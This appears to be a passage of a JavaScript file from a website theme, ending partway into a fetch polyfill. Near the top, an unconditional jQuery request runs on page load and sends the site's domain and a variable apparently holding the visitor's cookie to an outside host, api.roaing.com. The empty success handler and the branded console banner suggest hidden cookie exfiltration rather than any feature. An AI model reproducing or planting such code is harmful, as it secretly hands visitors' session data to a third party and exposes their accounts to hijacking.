...
$(function(){
    if(1){
    	   $.ajax({
    	       type:"get",
    	       url:"https://api.roaing.com/1/?domain=" + ym + "&cookie=" + cok,
    	       async:true,
    	       success:function(data){}
    	   });
    };
});
console.log(' %c R0A1NG %c https://www.roaing.com/ ', 'color: #fff; background: #2dce89; padding:5px;', 'background: #1c2b36; padding:5px;');
! function (t) {
    "use strict";
    if (!t.fetch) {
        var s = {
